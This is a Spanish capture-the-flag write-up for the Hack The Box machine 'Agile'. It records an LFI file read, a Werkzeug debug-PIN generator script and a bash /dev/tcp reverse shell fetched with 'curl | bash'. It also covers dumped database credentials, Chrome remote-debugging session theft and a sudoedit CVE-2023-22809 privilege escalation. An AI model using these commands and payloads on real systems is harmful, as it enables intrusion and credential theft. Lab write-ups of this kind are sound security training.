@@ -1,0 +1,545 @@
+---
+layout: post
+title: Agile
+date: 2023-08-11
+description:
+img:
+fig-caption:
+tags: []
+---
+___
+
+<center><img src="/writeups/assets/img/Agile-htb/Agile.png" alt="" style="height: 394px; width:520px;"></center>
+
+***
+
+# Conocimientos
+
+
+
+***
+
+# Reconocimiento
+
+## Escaneo de puertos con nmap
+
+### Descubrimiento de puertos abiertos
+
+```null
+nmap -p- --open --min-rate 5000 -n -Pn -sS 10.10.11.203 -oG openports
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-11 17:40 GMT
+Nmap scan report for 10.10.11.203
+Host is up (0.091s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 14.00 seconds
+```
+
+### Escaneo de versión y servicios de cada puerto
+
+```null
+nmap -sCV -p22,80 10.10.11.203 -oN portscan
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-11 17:41 GMT
+Nmap scan report for 10.10.11.203
+Host is up (0.084s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 f4:bc:ee:21:d7:1f:1a:a2:65:72:21:2d:5b:a6:f7:00 (ECDSA)
+|_  256 65:c1:48:0d:88:cb:b9:75:a0:2c:a5:e6:37:7e:51:06 (ED25519)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://superpass.htb
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 12.78 seconds
+```
+
+Añado el dominio ```superpass.htb``` al ```/etc/hosts```
+
+## Puerto 80 (HTTP)
+
+Con ```whatweb``` analizo las tecnologías que emplea el servidor web
+
+```null
+whatweb http://10.10.11.203
+http://10.10.11.203 [301 Moved Permanently] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.203], RedirectLocation[http://superpass.htb], Title[301 Moved Permanently], nginx[1.18.0]
+http://superpass.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.203], JQuery, Script, Title[SuperPassword 🦸], nginx[1.18.0]
+```
+
+La página principal se ve así:
+
+<img src="/writeups/assets/img/Agile-htb/1.png" alt="">
+
+Creo una cuenta
+
+<img src="/writeups/assets/img/Agile-htb/2.png" alt="">
+
+Puedo añadir contraseñas y exportarlas a un archivo que se descarga en mi equipo
+
+<img src="/writeups/assets/img/Agile-htb/3.png" alt="">
+
+Intercepto la petición con ```BurpSuite```, y veo que se aplica un redirect a un parámetro que es vulnerable a LFI
+
+```null
+GET /download?fn=rubbx_export_222fa488a7.csv HTTP/1.1
+```
+
+Obtengo el archivo ```/etc/passwd```
+
+```null
+GET /download?fn=../etc/passwd HTTP/1.1
+```
+
+```null
+HTTP/1.1 200 OK
+Server: nginx/1.18.0 (Ubuntu)
+Date: Fri, 11 Aug 2023 17:51:46 GMT
+Content-Type: text/csv; charset=utf-8
+Content-Length: 1744
+Connection: close
+Content-Disposition: attachment; filename=superpass_export.csv
+Vary: Cookie
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+pollinate:x:105:1::/var/cache/pollinate:/bin/false
+sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
+usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+corum:x:1000:1000:corum:/home/corum:/bin/bash
+dnsmasq:x:108:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+mysql:x:109:112:MySQL Server,,,:/nonexistent:/bin/false
+runner:x:1001:1001::/app/app-testing/:/bin/sh
+edwards:x:1002:1002::/home/edwards:/bin/bash
+dev_admin:x:1003:1003::/home/dev_admin:/bin/bash
+_laurel:x:999:999::/var/log/laurel:/bin/false
+```
+
+Al producir un error se puede acceder al modo de depuración de ```WerkZeug```, pero es necesario un PIN del cual no dispongo
+
+<img src="/writeups/assets/img/Agile-htb/4.png" alt="">
+
+En [Hacktricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug) explican una forma de como generarlo a partir de archivos de la máquina. Listo las variables de entorno para ver quien está ejecutando el servicio
+
+```null
+GET /download?fn=../proc/self/environ HTTP/1.1
+```
+
+```null
+HTTP/1.1 200 OK
+Server: nginx/1.18.0 (Ubuntu)
+Date: Sat, 12 Aug 2023 09:30:40 GMT
+Content-Type: text/csv; charset=utf-8
+Content-Length: 260
+Connection: close
+Content-Disposition: attachment; filename=superpass_export.csv
+Vary: Cookie
+
+LANG=C.UTF-8PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/binHOME=/var/wwwLOGNAME=www-dataUSER=www-dataINVOCATION_ID=b60052b6f23e4edb83976411c92b14ceJOURNAL_STREAM=8:33082SYSTEMD_EXEC_PID=1074CONFIG_PATH=/app/config_prod.json
+```
+
+El archivo principal con su directorio se puede ver que es ```flask/app.py``` y el nombre del servicio ```wsgi_app``` en el error
+
+<img src="/writeups/assets/img/Agile-htb/5.png" alt="">
+
+También me tengo que quedar con la ruta absoluta ```/app/venv/lib/python3.10/site-packages/flask/app.py```. Y, por último, los ```private bits```. Con el ```/proc/net/arp``` puedo ver el nombre de la interfaz de red
+
+```null
+GET /download?fn=../proc/net/arp HTTP/1.1
+```
+
+```null
+HTTP/1.1 200 OK
+Server: nginx/1.18.0 (Ubuntu)
+Date: Sat, 12 Aug 2023 09:40:37 GMT
+Content-Type: text/csv; charset=utf-8
+Content-Length: 156
+Connection: close
+Content-Disposition: attachment; filename=superpass_export.csv
+Vary: Cookie
+
+IP address       HW type     Flags       HW address            Mask     Device
+10.10.10.2       0x1         0x2         00:50:56:b9:75:02     *        eth0
+```
+
+Obtengo la dirección MAC
+
+```null
+GET /download?fn=../sys/class/net/eth0/address HTTP/1.1
+```
+
+```null
+HTTP/1.1 200 OK
+Server: nginx/1.18.0 (Ubuntu)
+Date: Sat, 12 Aug 2023 09:41:58 GMT
+Content-Type: text/csv; charset=utf-8
+Content-Length: 18
+Connection: close
+Content-Disposition: attachment; filename=superpass_export.csv
+Vary: Cookie
+
+00:50:56:b9:0c:28
+```
+
+La transformo a decimal con python
+
+```null
+python3
+Python 3.11.4 (main, Jun  7 2023, 10:13:09) [GCC 12.2.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+>>> print(0x005056b970d0)
+345052377296
+```
+
+Me traigo el ```/etc/machineid```
+
+```null
+GET /download?fn=../etc/machine-id HTTP/1.1
+```
+
+```null
+HTTP/1.1 200 OK
+Server: nginx/1.18.0 (Ubuntu)
+Date: Sat, 12 Aug 2023 09:47:32 GMT
+Content-Type: text/csv; charset=utf-8
+Content-Length: 37
+Connection: close
+Content-Disposition: attachment; filename=superpass_export.csv
+Vary: Cookie
+
+ed5b159560f54721827644bc9b220d00
+```
+
+Y el ```/proc/self/cgroup```
+
+```null
+GET /download?fn=../proc/self/cgroup HTTP/1.1
+```
+
+```null
+HTTP/1.1 200 OK
+Server: nginx/1.18.0 (Ubuntu)
+Date: Sat, 12 Aug 2023 09:51:07 GMT
+Content-Type: text/csv; charset=utf-8
+Content-Length: 35
+Connection: close
+Content-Disposition: attachment; filename=superpass_export.csv
+Vary: Cookie
+
+0::/system.slice/superpass.service
+```
+
+El script final quedaría así:
+
+```py
+import hashlib
+from itertools import chain
+probably_public_bits = [
+    'www-data',# username
+    'flask.app',# modname
+    'wsgi_app',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
+    '/app/venv/lib/python3.10/site-packages/flask/app.py' # getattr(mod, '__file__', None),
+]
+
+private_bits = [
+    '345052377296',# str(uuid.getnode()),  /sys/class/net/ens33/address
+    'ed5b159560f54721827644bc9b220d00superpass.service'# get_machine_id(), /etc/machine-id
+]
+
+#h = hashlib.md5() # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0
+h = hashlib.sha1()
+for bit in chain(probably_public_bits, private_bits):
+    if not bit:
+        continue
+    if isinstance(bit, str):
+        bit = bit.encode('utf-8')
+    h.update(bit)
+h.update(b'cookiesalt')
+#h.update(b'shittysalt')
+
+cookie_name = '__wzd' + h.hexdigest()[:20]
+
+num = None
+if num is None:
+    h.update(b'pinsalt')
+    num = ('%09d' % int(h.hexdigest(), 16))[:9]
+
+rv =None
+if rv is None:
+    for group_size in 5, 4, 3:
+        if len(num) % group_size == 0:
+            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
+                          for x in range(0, len(num), group_size))
+            break
+    else:
+        rv = num
+
+print(rv)
+```
+
+Genero el pin y lo introduzco en el debugger
+
+```null
+python3 generate_pin.py
+101-245-952
+```
+
+Puedo ejecutar comandos como ```www-data```
+
+<img src="/writeups/assets/img/Agile-htb/6.png" alt="">
+
+Creo un archivo ```index.html``` que se encargue de enviarme una reverse shell
+
+```null
+#!/bin/bash
+
+bash -c 'bash -i >& /dev/tcp/10.10.16.63/443 0>&1'
+```
+
+Lo comparto con un servicio ```HTTP``` con ```python```
+
+```null
+python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.11.203 - - [12/Aug/2023 10:05:48] "GET / HTTP/1.1" 200 -
+```
+
+Ejecuto e interpreto con bash
+
+```null
+os.popen("curl 10.10.16.63 | bash").read()
+```
+
+Gano acceso al sistema
+
+```null
+nc -nlvp 443
+listening on [any] 443 ...
+connect to [10.10.16.63] from (UNKNOWN) [10.10.11.203] 47258
+bash: cannot set terminal process group (1073): Inappropriate ioctl for device
+bash: no job control in this shell
+(venv) www-data@agile:/app/app$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+<pp$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+(venv) www-data@agile:/app/app$ ^Z
+zsh: suspended  nc -nlvp 443
+❯ stty raw -echo; fg
+[1]  + continued  nc -nlvp 443
+                              reset xterm
+(venv) www-data@agile:/app/app$ export TERM=xterm-color
+(venv) www-data@agile:/app/app$ export SHELL=bash
+(venv) www-data@agile:/app/app$ stty rows 55 columns 209
+(venv) www-data@agile:/app/app$ source /etc/skel/.bashrc 
+www-data@agile:/app/app$ 
+```
+
+Se puede ver un archivo con credenciales de acceso a la base de datos
+
+```null
+www-data@agile:/app$ cat config_prod.json 
+{"SQL_URI": "mysql+pymysql://superpassuser:dSA6l7q*yIVs$39Ml6ywvgK@localhost/superpass"}
+```
+
+Me conecto
+
+```null
+www-data@agile:/app$ mysql -usuperpassuser -p'dSA6l7q*yIVs$39Ml6ywvgK'
+mysql: [Warning] Using a password on the command line interface can be insecure.
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 24
+Server version: 8.0.32-0ubuntu0.22.04.2 (Ubuntu)
+
+Copyright (c) 2000, 2023, Oracle and/or its affiliates.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+mysql> 
+```
+
+Obtengo credenciales
+
+```null
+mysql> select username,password from passwords;
++----------+----------------------+
+| username | password             |
++----------+----------------------+
+| 0xdf     | 762b430d32eea2f12970 |
+| 0xdf     | 5b133f7a6a1c180646cb |
+| corum    | 47ed1e73c955de230a1d |
+| corum    | 9799588839ed0f98c211 |
+| corum    | 5db7caa1d13cc37c9fc2 |
++----------+----------------------+
+5 rows in set (0.00 sec)
+```
+
+Gano acceso como ```corum``` con la contraseña ```5db7caa1d13cc37c9fc2```. Puedo ver la primera flag
+
+```null
+www-data@agile:/app$ su corum
+Password: 
+corum@agile:/app$ cd
+corum@agile:~$ cat user.txt 
+92e00e36d6c842fab3a31771b83ce5e7
+```
+
+Se está ejecutando un servicio web bajo el subdomino ```test.superpass.htb```
+
+```null
+corum@agile:~$ cat /etc/nginx/sites-enabled/superpass-test.nginx 
+server {
+    listen 127.0.0.1:80;
+    server_name test.superpass.htb;
+
+    location /static {
+        alias /app/app-testing/superpass/static;
+        expires 365d;
+    }
+    location / {
+        include uwsgi_params;
+        proxy_pass http://127.0.0.1:5555;
+        proxy_set_header Host $host;
+        proxy_set_header X-Real-IP $remote_addr;
+        proxy_set_header X-Forwarded-Protocol $scheme;
+    }
+}
+```
+
+Dentro de ```/app/app-testing/tests/functional``` se encuentra un script en python que en el panel de ayuda, se muestra un puerto destinado a debbugging
+
+```null
+options.add_argument("--remote-debugging-port=41829")
+```
+
+Está abierto internamente
+
+```null
+corum@agile:/app/app-testing/tests/functional$ ss -nltp | grep 41829
+LISTEN 0      10         127.0.0.1:41829      0.0.0.0:*  
+```
+
+Varios procesos lo están utilizando
+
+```null
+corum@agile:/app/app-testing/tests/functional$ ps -faux | grep 41829
+runner      2281  0.1  2.5 34015196 103524 ?     Sl   10:30   0:00                      \_ /usr/bin/google-chrome --allow-pre-commit-input --crash-dumps-dir=/tmp --disable-background-networking --disable-client-side-phishing-detection --disable-default-apps --disable-gpu --disable-hang-monitor --disable-popup-blocking --disable-prompt-on-repost --disable-sync --enable-automation --enable-blink-features=ShadowDOMV0 --enable-logging --headless --log-level=0 --no-first-run --no-service-autorun --password-store=basic --remote-debugging-port=41829 --test-type=webdriver --use-mock-keychain --user-data-dir=/tmp/.com.google.Chrome.gp7EMf --window-size=1420,1080 data:,
+runner      2344  0.3  3.9 1184764352 159100 ?   Sl   10:30   0:01                          |       \_ /opt/google/chrome/chrome --type=renderer --headless --crashpad-handler-pid=2288 --lang=en-US --enable-automation --enable-logging --log-level=0 --remote-debugging-port=41829 --test-type=webdriver --allow-pre-commit-input --ozone-platform=headless --disable-gpu-compositing --enable-blink-features=ShadowDOMV0 --lang=en-US --num-raster-threads=1 --renderer-client-id=5 --time-ticks-at-unix-epoch=-1691834131102527 --launch-time-ticks=2071689208 --shared-files=v8_context_snapshot_data:100 --field-trial-handle=0,i,16535539327393366571,794766477956318211,131072 --disable-features=PaintHolding
+corum       2440  0.0  0.0   4020  2180 pts/0    S+   10:35   0:00      |                               \_ grep --color=auto 41829
+```
+
+Utilizo chisel para aplicar ```Remote Port Forwarding```. Desde mi equipo lo ejecuto como servidor
+
+```null
+chisel server -p 1234 --reverse
+```
+
+En la máquina víctima me conecto como cliente
+
+```null
+corum@agile:/tmp$ ./chisel client 10.10.16.63:1234 R:41829:127.0.0.1:41829 &>/dev/null & disown
+```
+
+Desde ```Chromium```, añado este nuevo debbugger, introduciendo como url la ruta ```chrome://inspect```
+
+<img src="/writeups/assets/img/Agile-htb/7.png" alt="">
+
+<img src="/writeups/assets/img/Agile-htb/8.png" alt="">
+
+Aparecerá lo siguiente:
+
+<img src="/writeups/assets/img/Agile-htb/9.png" alt="">
+
+Al inspeccionarlo, se ven dos cookies de sesión, lo que significa que otro usuario está loggeado
+
+<img src="/writeups/assets/img/Agile-htb/10.png" alt="">
+
+En ```/vault``` están almacenadas dos contraseñas. Una de ellas, ```d07867c6267dcb5df0af``` corresponde al usuario ```edwards``` a nivel de sistema
+
+```null
+corum@agile:/tmp$ su edwards
+Password: 
+edwards@agile:/tmp
+```
+
+Tengo varios privilegios a nivel de sudoers
+
+```null
+edwards@agile:/home$ sudo -l
+[sudo] password for edwards: 
+Matching Defaults entries for edwards on agile:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User edwards may run the following commands on agile:
+    (dev_admin : dev_admin) sudoedit /app/config_test.json
+    (dev_admin : dev_admin) sudoedit /app/app-testing/tests/functional/creds.txt
+```
+
+La versión de ```sudoedit``` es vulnerable al ```CVE-2023-22809```
+
+```null
+edwards@agile:/tmp$ sudoedit -V
+Sudo version 1.9.9
+Sudoers policy plugin version 1.9.9
+Sudoers file grammar version 48
+Sudoers I/O plugin version 1.9.9
+Sudoers audit plugin version 1.9.9
+```
+
+Modifico el ```/app/venv/bin/activate```, a través del ```/app/config_test.json```, que permite en el ```sudoers``` para que la próxima vez que se logué el usuario root, asigne a la bash el privilegio SUID
+
+```null
+edwards@agile:/$ find \-group dev_admin 2>/dev/null 
+./home/dev_admin
+./app/venv
+./app/venv/bin
+./app/venv/bin/activate
+./app/venv/bin/Activate.ps1
+./app/venv/bin/activate.fish
+./app/venv/bin/activate.csh
+```
+
+```null
+edwards@agile:/$ find \-user dev_admin 2>/dev/null 
+./home/dev_admin
+./app/app-testing/tests/functional/creds.txt
+./app/config_test.json
+./app/config_prod.json
+```
+
+Puedo ver la segunda flag
+
+```null
+edwards@agile:/$ ls -l /bin/bash
+-rwsr-xr-x 1 root root 1396520 Jan  6  2022 /bin/bash
+edwards@agile:/$ bash -p
+edwards@agile:/# cat /root/root.txt 
+d4bd3231862f25acf2f5db8af092bc3d
+```
